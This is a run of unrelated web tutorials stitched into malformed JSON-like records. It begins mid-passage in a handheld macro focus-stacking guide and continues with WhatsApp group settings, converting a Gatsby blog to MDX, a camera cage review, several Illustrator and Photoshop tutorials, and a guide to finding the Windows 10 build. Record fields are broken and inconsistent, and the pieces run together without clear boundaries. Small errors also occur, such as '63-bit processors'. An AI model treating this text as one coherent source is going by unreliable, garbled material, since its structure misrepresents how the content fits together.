moves between frames, you will have to start over. A good technique to avoid this is to hold on to your subject (or their home, if your subject is an insect) with the hand that\u2019s not holding the camera. \nTo stabilize both camera and subject, I will hold the stem of a plant between my fingers and rest the lens on either my wrist or the gap between index finger and thumb. \nNow there is only one last thing to mention before you get started, and that is: overshoot . You can never be sure that you have every slice of DOF that you will need to complete your stack. The best way to minimize this risk is to take 100 shots instead of ten. \nOf course, the amount of images you\u2019ll need in order to get it right depends on the magnification ratio and the aperture you\u2019re using, but you will get a feel for that as you review your stacks. And even if you just get two images in sequence before your subject flies off, that is still going to double the depth of field in your image: \n3. Post Processing \nBefore you start the actual stacking, I recommend that you develop your RAW files in Camera Raw and save them as JPEGs. This way you are sure to get the best image quality and it will speed up the process. \nLoad Files into Stack \nIn the next step, we are going to load all the files of our stack as layers into one new document. To do so, go into the \u201cFile\u201d tab in Photoshop and select \u201cScripts\u201d \u2192 \u201cLoad Files into Stack\u2026\u201d \nUnless you have a completely black or blurry background, leave both boxes in the dialogue window unchecked. Sometimes Photoshop gets confused by structures in the background and gets the alignment wrong. \nOnce all of the layers are loaded, we are going to put them all into a new group. Then we will duplicate this Group folder (Ctrl + J) to create a back-up, just in case we need to fix something later in the process. \nAuto-Align Layers \nBefore we use PhotoShop to align our layers for us, we\u2019re going to make sure that the background won\u2019t confuse the software. \nCreate a rough selection around your subject, and make sure that it contains the whole subject in all of your layers. Then invert the selection (\u201cCtrl\u201d+\u201dShift\u201d+\u201dI\u201d) and delete it in all layers of the group. \nOnce finished you should have two groups: the original \u201cGroup 1\u201d on the bottom and its duplicate \u201cGroup 1 Copy\u201d with the isolated subject up top. \nSelect the group that we just worked on and go into the \u201cEdit\u201d menu. Select Auto-Align Layers and choose the Auto-mode in the following dialogue window. \nPhotoshop is going to move the freshly aligned layers into the top left corner of your document. To move them back, select the whole group and press \u201cCtrl\u201d+\u201dT\u201d. Then turn down the layer opacity to 50% and move the group back where it came from. \nTurn the opacity up again and look through all layers to ensure they are aligned well enough. Some slight shifts are acceptable, but the cleaner your stack, the easier the next step will be. \nBlend Layers \nDuplicate the group once again. Then deactivate the new copy and select the group named \u201cGroup 1 copy,\u201d go into the \u201cEdit\u201d menu and click \u201cAuto-Blend Layers\u2026\u201d In the following dialogue window, select \u201cStack\u201d and make sure \u201cSeamless Tones and Colors\u201d is checked. \nOnce Photoshop is done, merge the group into one layer and zoom in to inspect the result. There is a good chance that the Photoshop got some things wrong, and they\u2019re not always obvious, so be thorough. If everything looks good, you can skip the next step; if there are glitches or artifacts, we will need to touch them up manually. \nTouching up \nNow it\u2019s time to touch up the image. To do so, we will paint in bits and pieces from our back-up group by using layer masks. \nSelect \u201cGroup 1 copy 2\u201d and deactivate all layers in it except for the very bottom layer. Add a black layer-mask to this layer by holding the \u201calt\u201d-key while clicking on the layer mask symbol. \nUse \u201cCtrl\u201d+\u201dI\u201d to switch between a black and white layer-mask and determine the parts of the layer that should be in the final image. Then set the layer mask back to black and use a the eraser tool at about 50% hardness to paint in the missing pieces. Move on to the next layer and repeat the process until you\u2019re satisfied with the result. \nOnce you are done with this, all that\u2019s left to do is to get rid of the hard edges around your subject. To blend it in, create a white layer-mask for the entire group and paint over its edges with a soft black paint brush. \nBefore exporting the image, I typically delete unwanted layers, such as \u201cGroup 1\u201d in this case. Then I duplicate all layers and merge them into one layer that I convert into a smart object. Lastly, I will finish the image off by applying the Camera Raw filter in Photoshop and performing some slight adjustments. \nDone! \nAnd here you see the final image. This would have been tricky to shoot with a focusing rail\u2014the long set up time, wind in the environment and the limitations of using a tripod make it challenging to use rails in the field. In terms of flexibility and required gear, handheld stacking is a lot more practical. \nThe only downside to this technique is some extra work in post processing. A fair trade, I think. \nAnd with a bit of practice, manual focus stacking is an easy technique that will open up new possibilities for your photography. \nAbout the author : Maximilian Simson is a London-based portrait and event photographer who also shoots fine art and macro photography.

      "text": "Almost every internet user is using one or more social media services like Facebook, Instagram, Twitter, Whatsapp, etc. Facebook and Whatsapp are the most commonly used social media apps. If you are a regular WhatsApp user then must face this problem many times. Group admins or your friends ads you to their WhatsApp groups , where they share funny posts, video or might be kind of business group without your permission. \nBasically, anyone who has your mobile number can add you to her/his WhatsApp group and they don\u2019t need your permission. Many times we don\u2019t want to join the group because of notifications, or annoying posts which they share in the group. \nAll we can do is to just leave that group or ask group admin to just don\u2019t add me again or turn notification of that group to silent but they can also add you again and again because we don\u2019t receive any kind of permission or confirmation, which very annoying. \nAdvertisement \nWhatsapp was receiving this issues Reports from a long time, many users requested WhatsApp to add some kind of permission feature or conformational message where users can accept or cancel group invitation. \nNow, the wait is over for these users. Whatsapp added this feature to the new version which allows its users to take control WhatsApp group permissions too. \nStop People from Adding You to WhatsApp Groups without permission \nFirst, you need to update your WhatsApp to the latest versions . To do this open Google Play store on android phone and App Store on iOS devices, search for WhatsApp and click update if available. \nAfter updating WhatsApp , open settings from the top right corner click on 3 doted icons . \nIn settings, tap on Accounts and then privacy . \nScroll down and you will see a new option named Groups . With this new feature you can control the group\u2019s permissions too like who can add me to groups: \nEvery one \nMy Contact \nNo Body \nBy default this option is set to everyone , you have to decide what you want to do with this. This is not just like if you set to my contact means your contacts will add you to their group. If you leave they can do that again. In this case, you have to set this option to nobody. If you want to join any group or friend wants you to add with your permission then you must change these settings to my contact temporarily . \nIf you don\u2019t find this group option in privacy, that means you have to update your app and install the new WhatsApp update .",

      "title": "How to convert an existing Gatsby blog to use MDX",
      "text": "What is MDX? \nMDX is a file format that lets you add JSX to Markdown files via a .mdx file! It was started by and is maintained by Gatsby\u2019s John Otander and the open source community on Github . \nWith MDX, you can import React components and declare them alongside regular markdown syntax with JSX. This is useful to display specific component examples alongside the actual code, complex interactive components like charts, reusable components across multiple pages like sign-up forms, and more! \nAdding MDX to Gatsby Starter Blog \nIt can be a big tricky to add MDX to an existing blog. The following 5 steps will cover how to install and configure MDX to work with Gatsby\u2019s blog starter , which as of today\u2019s version , does not have MDX pre-installed. \nYou can also see the full changes in PR #19580 for an overview of the changes you have to make to get MDX working. As stated above, this introduces changes to Gatsby\u2019s blog starter , which you can install with Gatsby CLI. \ngatsby new my-blog-starter https://github.com/gatsbyjs/gatsby-starter-blog \nStep 1 \nInstall gatsby-plugin-mdx , the official plugin for using MDX with Gatsby. Also install gatsby-plugin-feed-mdx for our RSS feeds. Finally, install @mdx-js/mdx and @mdx-js/react . \nnpm install --save gatsby-plugin-mdx gatsby-plugin-feed-mdx @mdx-js/mdx @mdx-js/react \nStep 2 \nIn gatsby-config.js , replace gatsby-transformer-remark with gatsby-plugin-mdx , along with the following changes: \ngatsby-config.js \n{ \n- resolve: `gatsby-transformer-remark`, \n+ resolve: `gatsby-plugin-mdx`, \noptions: { \n+ extensions: [`.mdx`, `.md`], \n- plugins: [ \n+ gatsbyRemarkPlugins: [ \n{ \nresolve: `gatsby-remark-images`, \noptions: { \nmaxWidth: 590, \n}, \n}, \n{ \nresolve: `gatsby-remark-responsive-iframe`, \noptions: { \nwrapperStyle: `margin-bottom: 1.0725rem`, \n}, \n}, \n`gatsby-remark-prismjs`, \n`gatsby-remark-copy-linked-files`, \n`gatsby-remark-smartypants`, \n], \n}, \n}, \nFor reference, here\u2019s the full configuration for gatsby-plugin-mdx . \ngatsby-config.js \n{ \nresolve : ` gatsby-plugin-mdx ` , \noptions : { \nextensions : [ \".mdx\" , \".md\" ] , \ngatsbyRemarkPlugins : [ \n{ \nresolve : ` gatsby-remark-images ` , \noptions : { \nmaxWidth : 590 , \n} , \n} , \n{ \nresolve : ` gatsby-remark-responsive-iframe ` , \noptions : { \nwrapperStyle : ` margin-bottom: 1.0725rem ` , \n} , \n} , \n{ \nresolve : ` gatsby-remark-vscode ` , \n} , \n{ \nresolve : ` gatsby-remark-copy-linked-files ` , \n} , \n{ \nresolve : ` gatsby-remark-smartypants ` , \n} , \n] , \n} , \n} , \nThen, replace gatsby-plugin-feed with gatsby-plugin-feed-mdx . This will allow the the RSS feed of the site to parse MDX. \ngatsby-config.js \n- `gatsby-plugin-feed`, \n+ `gatsby-plugin-feed-mdx` \nNow, since we\u2019re no longer using gatsby-transformer-remark and gatsby-plugin-feed , you can uninstall them. \nnpm uninstall --save gatsby-transformer-remark gatsby-plugin-feed \nStep 3 \nIn gatsby-node.js , replace allMarkdownRemark with allMdx . \ngatsby-node.js \n# line 11 \n- allMarkdownRemark( \n+ allMdx( \ngatsby-node.js \n# line 35 \n- const posts = result.data.allMarkdownRemark.edges \n+ const posts = result.data.allMdx.edges \nNext, replace MarkdownRemark with Mdx . \ngatsby-node.js \n# line 56 \n- if (node.internal.type === `MarkdownRemark`) { \n+ if (node.internal.type === `Mdx`) { \nStep 4 \nIn src/pages/index.js , replace allMarkdownRemark with allMdx in the render() method. \nsrc/pages/index.js \n# line 13 \n- const posts = data.allMarkdownRemark.edges \n+ const posts = data.allMdx.edges \nAlso replace allMarkdownRemark with allMdx in the GraphQL query. \nsrc/pages/index.js \n# line 59 \n- allMarkdownRemark(sort: { fields: [frontmatter___date], order: DESC }) { \n+ allMdx(sort: { fields: [frontmatter___date], order: DESC }) { \nStep 5 \nIn src/templates/blog-post.js , replace markdownRemark with mdx in the render() method. \nsrc/templates/blog-post.js \n# line 11 \n- const post = this.props.data.markdownRemark \n+ const post = this.props.data.mdx \nAlso replace markdownRemark with mdx in the GraphQL query. \nsrc/templates/blog-post.js \n# line 93 \n- markdownRemark(fields: { slug: { eq: $slug } }) { \n+ mdx(fields: { slug: { eq: $slug } }) { \nAdd an import statement for MDXRenderer from gatsby-plugin-mdx . \nsrc/templates/blog-post.js \n# line 3 \n+ import { MDXRenderer } from \"gatsby-plugin-mdx\" \nWe\u2019ll be using body instead of html in our GraphQL query. \nsrc/templates/blog-post.js \n# line 96 \n- html \n+ body \nNow we can replace the <section> element with the dangerouslySetInnerHTML attribute and instead use <MDXRenderer> with post.body . \nsrc/templates/blog-post.js \n# line 41 \n- <section dangerouslySetInnerHTML={{ __html: post.html }} /> \n+ <MDXRenderer>{post.body}</MDXRenderer> \nAnd\u2026 that\u2019s it! After these changes, a Gatsby blog should be able to use MDX files to render JSX alongside markdown. To test that everything works, add a .mdx file to [your-blog]/content/blog/ and write some JSX. Then, run gatsby develop and check localhost:8000/blog/ for your new post. The JSX should rendered as an element on the new post page. \nFor example, the following code should render a test button. Navigate to localhost:8000/blog/example/ and you should see a clickable button in your blog post! \ncontent/blog/example.mdx \n--- \ntitle: MDX! \ndate: \"2019-10-22\" \ndescription: \"A post showing MDX in action\" \n--- \nThis is a post showing MDX in action. This starter now comes with MDX out-of-the-box! \n```js \n// you can write JSX in your Markdown! \n<button>test</button> \n``` \n<button>test</button> \n## MDX \nMDX lets you write JSX embedded inside markdown, perfect for technical blogs. MDX works with Gatsby through [gatsby-plugin-mdx](https://www.gatsbyjs.org/packages/gatsby-plugin-mdx/). You can learn more about it in the Gatsby docs: [Getting Started with MDX](https://www.gatsbyjs.org/docs/mdx/getting-started/). \nIf you\u2019re interested in spinning up a new personal blog with MDX, I\u2019ve prepared Gatsby personal blog starter for your usage! \nFurther Reading \nGatsby Reference Guide on MDX \nMDX Gatsby Documentation",

      "text": "Lanparte BMPCC 4K/6K Camera Cage, Whats new? \nDecember 19, 2019 by Lee Herbet Leave a Comment \nVIDEO \nA few months ago I reviewed the Lanparte cage for the 4K Black Magic Pocket Cinema Camera and really liked it. You can find the full review for that here . What could they have possibly improved for the 6K version ? ( B&H | Amazon ) \nA handy feature of the Black Magic Pocket Cinema Camera 6K is that it is pretty much the exact same size and shape as the Black Magic Pocket Cinema Camera 4K. So most cages made for the 4K will fit the 6K. That is true in this example too \u2013 the 4K cage will fit the 6K camera and the 6K cage will fit the 4K camera. \nSo what have Lanparte done to change or improve on their 4K Cage? Because improve it they have. My top three in reverse: \nFit \nThe Lanparte BMPCC cage for the 6K fits tight on the body of the camera and immediately feels secure but light at the same time. This is similar to the previous model but still a definite winner. \nThe top handle \nThis is easy to add to the cage and slides on without a fuss. There is also an option to attach it on the side of the camera for portrait mode (if that\u2019s the way you roll). \nThe quick-release system \nThis is the winner for me. As a general rule, cages can give us a lot of options to add accessories but sometimes, getting the camera in and out can be, well, a challenge. Moving from cage to gimbal or tripod and back can often mean a complete stop to disassemble the cage, but not with the Lanparte cage. They\u2019ve cleverly added a quick-release system that is, as it states, quick but without feeling like you\u2019re compromising anything. There\u2019s a latch on one side and then a quick-release button and voila, out of the cage. It does also come with a thumbscrew to secure it on top of the camera if you know that it\u2019s going to be in the cage all day so you get the benefit of security too. \nThe Lanparte BMPCC 4K/6K Camera Cage retails for US$89. \nThe pack including the cage, top handle, rod and hard drive holder is US$239 ( B&H | Amazon )",

      "title": "How to Make, Save and Load Gradients in Adobe Illustrator",
      "text": "Welcome to How to Make a Gradient in Illustrator! In this tutorial, you will learn the step-by-step process of how to create basic gradients in Adobe Illustrator. \n1. How to Make a Gradient in Illustrator \nStep 1 \nTo create a gradient, you must first have access to the Gradient panel. This should be located in the toolbar on the right. You can also access this by going to Window > Gradient. \nStep 2 \nClicking in the Gradient panel for the first time will select a white and black gradient by default (otherwise, the last used gradient will be applied by default). To apply a gradient to an object, first select the object to which you want to apply the gradient by clicking on it. Then simply click on the Gradient Box or the Gradient Bar inside the Gradient panel. \nThis will automatically apply the gradient to the object. By editing the look of the gradient in the Gradient panel, you will also change the gradient of the selected object. \nStep 3 \nTo define the gradient colors, double-click on one of the color stops under the gradient bar. This will open up some options to choose a color. When you choose a color, it will automatically be applied to the gradient. \nStep 4 \nDefine an ending color by clicking on the color stop on the right of the bar. \nStep 5 \nOnce the colors have been defined, you can choose to adjust the location of the starting point and/or the end point. This will change the look and smoothness of the gradient. To do this, click and drag the color stop left or right until you are happy with the result. \nStep 6 \nTo edit the look of the gradient further, you can adjust the location of the midpoint (represented by the diamond icon). This is where the gradient displays an even mix of both the starting and ending colors. To do this, simply drag the diamond left or right. \nStep 7 \nYou can also add extra colors to your gradient. To do this, click below the gradient bar to create another color stop. Choose a color as you did previously and use the mouse to click and drag a location for the color stop. Repeat this technique to create more color stops. \nStep 8 \nTo delete a color stop, simply select it with the mouse and click on the Delete Stop button or click and drag the color stop downwards. \nStep 9 \nYou can also adjust the angle of the gradient by choosing a value in the Angle Dropbox or by entering a value. \nThe angle will be automatically applied if you have an object selected. \nStep 10 \nTo adjust the opacity of a color stop, click on the color stop and use the Opacity Dropbox underneath the Gradient Bar. You can either type a value into the box or move the Opacity slider in the control panel. \nThe opacity of a color is represented by a checkered pattern when the value is below 100%. \nStep 11 \nYou can also choose the Gradient Type by clicking on one of the options at the top of the Gradient panel. \n2. How to Save a Gradient in Illustrator \nStep 1 \nTo save a new gradient that you have created, you must add it to the Swatches. To do this, open up the Swatches panel ( Window > Swatches ). \nStep 2 \nWith the gradient still selected, click on the New Swatch button. \nStep 3 \nName the swatch in the popup window and click OK . This will create a new swatch with the gradient that you have created. You can also click and drag the gradient fill box from the Gradient panel into the Swatches panel. \nFor example, we have named the new gradient 'Dark Bronze'. Every new swatch you create will appear at the end of the list. \nStep 4 \nTo save the swatch library, click on the library button on the bottom left and select Save Swatches . Enter a file name and click Save . This will save your current swatches library in the default location for Illustrator, although you can specify a new location if you wish. \n3. How to Load a Gradient in Illustrator \nStep 1 \nIllustrator provides a preset range of gradients that you can use in the Gradient panel or the Swatches panel. All the gradients you create will also be found in the Swatches panel. \nOpen the Swatches panel by going to Window > Swatches. \nStep 2 \nClick on the library button on the bottom left. This will open up all the swatch options for you to choose from. To choose one of the preset gradients, navigate to Gradients and choose from a wide range of options such as metals, seasons, sky, water, and earth tones. \nStep 3 \nTo load the swatch library that you have created and saved previously, navigate to User Defined , and select the saved file name from the list. \nAwesome! You're Finished! \nCongratulations! You have successfully completed this tutorial.

      "text": "In today\u2019s tutorial we\u2019re going to continue the Western theme and learn how to create a little cowboy boot using some of the most basic shapes and tools that Illustrator has to offer. \nSo, assuming you already have the software up and running, let\u2019s jump straight into it! \nTutorial Details: Cowboy Boot Icon \nProgram: Adobe Illustrator CS6 \u2013 CC 2018 \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Grid Positioning \nEstimated Completion Time: 30 Minutes \nFinal Image: Cowboy Boot Icon \nStep 1 \nAs always, we\u2019re going to kick things off by setting up a New Document by going over to File > New (or using the Control-N keyboard shortcut), which we will adjust as follows: \nNumber of Artboards: 1 \nWidth: 64 px \nHeight: 64 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web , the only one that you\u2019ll have to manually adjust being the Artboard\u2019s Size ( Width x Height ). \nStep 2 \nStart working on the boot by creating the main shape for its heel section using a 12 x 8 px rectangle, which we will color using #B58362 and then position at a distance of 6 px from the underlying Artboard \u2019s bottom-left corner. \nStep 3 \nAdjust the shape that we\u2019ve just created by selecting its bottom-left anchor point using the Direct Selection Tool (A) and then pushing it to the right side by a distance of 4 px using the Move tool ( right click > Transform > Move > Horizontal > 4 px ). \nStep 4 \nTake a couple of moments and draw the 6 px tall outsole ( #B58362 ) using the reference image as your main guide, moving on to the next step once you\u2019re done. \nStep 5 \nSelect the heel and the sole and then combine them into a single larger shape using Pathfinder \u2019s Unite Shape Mode . \nStep 6 \nGive the resulting shape an outline using the Stroke method, by creating a copy of itself ( Control-C ) which we will paste in front ( Control-F ) and then adjust by first changing its color to #383C44 . Then, flip its Fill with its Stroke ( Shift-X ) setting its Weight to 4 px and its Corner to Round Join . \nStep 7 \nSelect the Pen Tool (P) add draw 4 px wide 4 px Stroke line ( #383C44 ) with a Round Cap , which we will position onto the larger outline as seen in the reference image. Once you\u2019re done, select and group all of the current section\u2019s composing shapes using the Control-G keyboard shortcut. \nStep 8 \nCreate a copy ( Control-C ) of the sole\u2019s fill shape, which we will paste in front ( Control-F ) and then use to create the upper section of the boot, by first changing its color to #EF855B and then removing its bottom anchor points , drawing a new shape using the reference image as your main guide. \nStep 9 \nGive the resulting shape an 4 px thick outline ( #383C44 ), making sure to select and group the two together afterwards using the Control-G keyboard shortcut. \nStep 10 \nWith the Pen Tool (P) still selected, draw the little 8 px tall collar, which we will color using #B58362 and then give the usual 4 px thick outline ( #383C44 ). Take your time and once you\u2019re done, select and group ( Control-G ) the resulting shapes together before moving on to the next step. \nStep 11 \nStart working on the pull strap, by creating an 8 x 20 px rectangle ( #EDC998 ), which we will adjust by adding a new anchor point to the center of its bottom edge using the Add Anchor Point Tool (+) , which we will then select and push to the bottom by a distance of 4 px using the Move tool ( right click > Transform > Vertical > 4 px ). \nStep 12 \nGive the resulting shape a 4 px thick outline ( #383C44 ) followed by four 2 x 2 px circles ( #383C44 ) vertically stacked at 2 px from one another. Once you\u2019re done, select and group ( Control-G ) all of the current section\u2019s composing shapes together, before moving on to the next step. \nStep 13 \nAdd the boot\u2019s vertical detail line using a 14 px tall 4 px thick Stroke ( #383C44 ), which we position as seen in the reference image, so that it ends up connecting the strap to the sole\u2019s outline. \nStep 14 \nFinish off the boot and with it the project itself by creating an 8 px wide 4 px thick Stroke line ( #383C44 ) with a Round Cap , which we will position on top of the previous shape as seen in the reference image. Once you\u2019re done, select and group ( Control-G ) all of the upper body\u2019s composing shapes, doing the same for the entire composition afterwards. \nIt\u2019s a Wrap! \nThere you have it folks, an easy step-by-step tutorial on how to create your very own cowboy boot in a matter of minutes. \nAs always I hope you\u2019ve managed to follow each and every step, and if you have any questions feel free to post them within the comments section and I\u2019ll get back to you as soon as I can. \nCowboy Boot Icon \nAuthor: Andrei \u0218tefan \nJust another coffee addict / pixel grinder, creating colorful projects one pixel at a time. \nThe post How to Create a Cowboy Boot Icon in Adobe Illustrator appeared first on Vectips .",

      "title": "Introduction to Photoshop Layer\u00a0Styles",
      "text": "Photoshop layer styles are a popular way to add effects, such as drop shadows and strokes, to layers in a non-destructive way. With the right knowledge and experience, any effect can be achieved. Whether it's a Photoshop metal layer style, a Photoshop glass layer style, a Photoshop cartoon layer style, or even a Photoshop gold layer style, you can quickly bring your artwork to the next level in a matter of minutes. \nTo achieve these effects, however, you need to understand what each setting does and how they can be combined to achieve a certain look. \nFrom working with different layer styles in Photoshop to how to add a layer style in Photoshop, or how to apply layer styles in Photoshop, I'm going to show you how easy the entire process is. \nSo no matter if you're working with Photoshop CS5 layer styles or the newer version, you'll follow the same steps, in the end achieving the same result. \nAlso, if you're looking for the best Photoshop layer styles, I've included a quick selection at the end of the tutorial, which should get you started on building a custom library. \nFollow along with us on our Envato Tuts+ YouTube channel : \nWhat Are Layer Styles and How Are They Used? \nPhotoshop introduced layer styles way back in version 6 as a way to add effects to a layer without having to manually create them. You add effects using an interface of easy-to-use checkboxes, sliders, and more, which can be saved as presets to be reused later on. \nThe \"wow\" factor quickly wore off as people grew tired of seeing the default presets used over and over again. It wasn't until recently that the true power of layer styles was utilized, but it has quickly become a simple and effective way to instantly enhance your designs \nGetting Started With Layer Styles \nPhotoshop comes with a plethora of layer style presets, all of which you should never use unless you are just learning to apply effects to your layers. Why? Because in addition to most of them just looking bad, they are instantly recognizable to other designers, and nothing screams \"amateur\" more than default program settings. \nHow to Apply Layer Styles \nThere are two main ways to apply layer styles, both of which are quick and easy. \nMethod 1: Using A Preset \nCreate a new Photoshop document and, in addition to the default background layer, create a new line of text. \nIn the main menu, click Window > Styles to open the Styles palette. With your text layer selected, simply click on one of the preset thumbnails within the Layers palette, and you will see it automatically applied to your layer. The first time you click through and load each preset, you should experience an overwhelming feeling of happiness as you begin to understand all of the potential that layer styles hold. \nMethod 2: Starting From Scratch \nCreate a new Photoshop document and, in addition to the default background layer, create a new line of text. \nIn the Layers palette, right-click the name of the layer you want to add effects to and click Blending Options... to bring up the Layer Style dialog box (you can also double-click the name of the layer in the Layers palette). \nWe will go over each section of the Layer Style dialog box in the latter parts of this guide; right now, we are just getting acquainted with how they are applied. \nYou will notice that once you add a layer style to your layer, a list of effects that are being used shows up in the Layers palette. You can show/hide each of the effects by clicking the eyeball icon next to the name of each effect. This allows you to quickly hide a specific effect, while keeping the settings intact in case you want to turn it back on. \nHow to Save/Load Presets \nLoading Presets \nAs we mentioned above, we will get into creating your own custom layer styles in the following installments of our guide, but in the meantime I know you want to play around with layer styles while you wait. There are plenty of free and premium layer styles available for download (we will refrain from any bias recommendations), so we will look at how to load presets in Photoshop that you have downloaded online. See the end of the article for a bonus style that you can practice with. \nWhen you have downloaded your layer style, save the included .ASL file to a known folder on your computer. Most downloadable styles will come in a zip file so you will need to extract the .ASL file first. \nTo add the presets to Photoshop, simply open up the Styles advanced menu and click on Load Styles , indicating the location of the file afterwards. \nYou may notice multiple styles appear in your Styles palette. Lucky you! Photoshop .ASL files can contain hundreds of different style presets, all within the same file, making it easy to share presets with others. \nSaving Presets \nIf you have created your own presets or want to save a bunch that you have collected, you can save them easily from the Styles palette. \nTo save a preset (or group of presets), open the dropdown menu from the Styles palette and click Save Styles... You will be prompted to choose a name and location on your computer for your presets file, and then simply click Save . \nTips and Tricks for Beginners \nThere are a few tricks to learn when becoming proficient with layer styles that only come with experience, unless of course you are reading this guide. \nLayer styles cannot be added to locked layers. You may have created a new document, selected the background layer, and clicked a layer style preset, only to see a whole bunch of nothing happening. It is because the background layer is locked. You cannot add new layer styles to locked layers. You can, however, add layer styles to a layer prior to locking it to prevent editing of that layer. You can then unlock it later if you decide to change the settings of your layer style later. \nYou can increase the size of the thumbnails in the Styles palette by opening the Styles palette dropdown menu and toggling the display type between Text Only, Small Thumbnail, Large Thumbnail, Small List, and Large List. \nMost layer styles are created to look their best on bolder fonts and/or at larger sizes. If you apply a style you found online and are unhappy with how it looks, you might want to try a different font or a larger text size. \nLayer styles themselves can be resized , so if you find a layer style that looks good at a certain size but want to shrink your text, you can resize the effect to match any size of text. Simply right click the list of effects that are applied to the layer in the Layers palette and click \"Scale Effects\". You can then scale your effects using a percentage. \nYou can copy and paste styles between layers in the same document as well as between layers in different documents. Right-click the name of the layer in the Layers palette and click \"Copy Layer Style\", and then on another layer, right-click again and select \"Paste Layer Style\". \nYou can hide the layer contents while showing only the effects.

      "text": "Sometimes finding build and version of Windows 10 is really important that you have currently installed on your PC. In addition to Windows 10 versions and builds there are still different editions of Windows like Home, Pro, etc. that is also required to know sometime. \nAs you might know that Microsoft claims versions Windows 10 is going to stay here and new builds and updates will be released. Windows 10 new build pop up with major updates twice a year like Windows 10 Anniversary update , October Update 2018 and the last Windows 10 feature update released is Windows 10 May update 2019 . Continue reading and you will understand the difference between Windows 10 Versions, Builds, and Editions. \nAdvertisement \nIf you don\u2019t know which Windows version and build number currently you are using and it\u2019s really important for you to know it then let\u2019s have a look at how to find Windows 10 version and build number with different methods and also know if your computer support 32-bit or 64-bit operating system. \nDifference between Windows versions, editions, builds and architectures \nBefore we dive into this, let\u2019s clear similar terms which are very easy to confuse like Windows versions, editions, builds and Architecture. \nWindows Versions : Microsoft Windows version refers to major release or you can say friendly names like Windows 7, Windows 8/8.1 but the version number is more specific as compared to a simple version like Windows version number was 6.1 and Windows 10 released twice in a year as I said before. \nWindows Editions : Windows edition a bit different, these are the flavors of operating system like windows has different flavors and of course, these flavors have different features such as Windows 10 Home, Windows 10 Enterprise, Windows 10 Pro and Windows 10 Education. \nWindows build number : Build number is the most specific or exact version of the operating system that you have installed. This will show the exact number of windows version. \nWindows Architecture : it means that you have a 32-bit or 64-bit processor you have in your computers. It also affects your windows and performance. 63-bit processors are more powerful as compare to 32-bit because 64-bit processor can handle more data at once. You can\u2019t install 64-bit windows and apps to 32-bit OS but 64-bit OS allows you to install 32-bit Apps and Windows. \nYou also have to install 32-bit Windows to the 32-bit processor and 64-bit Windows to a 64-bit processor. \nHow to find Windows 10 version or Build number \nMethod 1: Using winver command \nFinding Windows version or build number using winver command is the quickest way. To do this first you need to press \u201c win + r\u201d from the keyboard. \nAlternatively , just press the windows key form your keyboard and type \u201cwinver\u201d and then select winver from the search result. \nThe run command will be open where you type the name of a program, folder, document or internet resource and Windows will open it for you. Here type \u201cwinver\u201d and click on Ok. \nWhen you click the OK button from run command, About Windows popup will appear. Here you will find your installed Windows 10 version, OS build and Windows 10 edition like in my case I have Windows version 1903 with OS build number 18362.116 and Windows 10 Pro edition. \nMethod 2: From Settings app \nThis method will also show your desired information but look will be different as compare to \u201cAbout Windows\u201d. First, you need to open Settings by clicking on \u201cAll settings\u201d from the notification panel. \nAlternatively : Press Windows key form your keyboard and type settings, then select Settings app from the search results. \nIn Windows Settings, click on the first option \u201cSystem\u201d. \nAfter clicking on the system, scroll down to find \u201cAbout\u201d tab from the left menu list and click on it. \nNow you will find everything about your Windows in \u201dWindows specifications\u201d section. \nHow to check, Is my computer 32-bit or 64bit? \nif you wanted to find out whether your computer is 32-bit or 64bit. follow the steps below. We already a discuss difference between 32-bit and 64-bit processors above. \nOpen All Settings from the notfication panel, then click on System options. After that scroll down to the end of the page and click on About . Here it shows System type. The 64-bit operating system, X64-based processor. Which means I have installed 64-bit Windows 10 on my computer and my computer\u2019s processor is 64-bit. \nAlternatively: Simply right-click on This PC from desktop and select Properties . \nHow to find out the Latest Windows 10 Update \nNow you know how to check Windows 10 version and build number but not sure yet which version or build number is the latest right now. Recently Windows 10 May update released with many features and changes a few days ago. You might want to install Windows 10 May update 2019 right now ? You may also look at Windows 10 May update 2019 feature and changes . \nThe simple and easy way to check current Windows 10 version is by checking form Microsoft Download windows 10 page . \nHow to find out the Latest Windows 10 build number \nTo find out the latest Windows 10 build number you also have to look at Microsoft Windows 10 release information page . On this page you will find out all the previous and current released build history such as version, Servicing option, availability date, OS build, latest revision date, and end of service.",

      "text": "In this Photoshop tutorial, we will explain how to create an amazing 3D-like text effect using some gradient fills, lasso tools, and the Dodge and Burn Tools. \nFinal Image Preview \nResources \nStep 1 \nCreate a new document , 800\u00d7500 pixels, or any other dimensions depending on the text you\u2019re going to create. Then, set the Foreground color to #b7e101 , and the Background color to #74a203 , and pick the Gradient Tool . \nChoose the Foreground to Background fill , and click the Radial Gradient icon in the Options bar, then click and drag from the center of the document to one of the corners to create the gradient fill. \nCreate the text in Bold All Caps using the color White and the font Familian with a Size value of 175 pt , then, set the Tracking value in the Character panel ( Window > Character ) to 100 to avoid overlapping. \nGo to Layer > Rasterize > Type to rasterize the text layer, then duplicate the text layer and make the original layer invisible by clicking the eye icon next to it. \nStep 2 \nDouble click the copy text layer to apply a Gradient Overlay effect , and click the Gradient drop-down option to create the gradient used. \nThere are only two colors used: #fffca6 to the left , and #cce80d to the right . \nThis is how the text should look like. \nStep 3 \nGo to Edit > Transform > Skew , and move the upper corners to get a result similar to the one below. Then press Enter to get out of the Skew Mode. \nPick the Rectangular Marquee Tool , and draw a 5 x 188 px rectangle on top of the first letter. You can check the dimensions in the Info panel ( Window > Info ). \nCreate a new layer on top of all layers and fill the selection with white . Go to Select > Deselect (or press Ctrl + D ) to get rid of the selection. \nGo to Filter > Blur > Gaussian Blur and enter 2.5 for the Radius value. \nStep 4 \nCreate a new 24 x 195 px selection, create another new layer , fill the selection with white , and get rid of the selection. \nGo to Filter > Blur > Gaussian Blur and enter 9 for the Radius value this time. \nSelect both blur layers then go to Layer > Merge Layers , and rename the merged layer to \u201c Blur \u201c. \nStep 5 \nGo to Edit > Transform > Rotate , and rotate the blurred part as below, then press Enter . \nDuplicate the \u201c Blur \u201d layer and move it so that you have blur placed over each letter. Then, select all the Blur layers and merge them ( Layer > Merge Layers ). \nCtrl + Click the copy text layer\u2019s thumbnail (icon) to create a selection, then go to Select > Inverse to invert the selection. \nPress Delete to get rid of the outer parts of the blur, then press Ctrl + D to get rid of the selection. \nStep 6 \nMake the original text layer visible again. \nGo to Edit > Transform > Skew , and skew this text a bit more to the right. 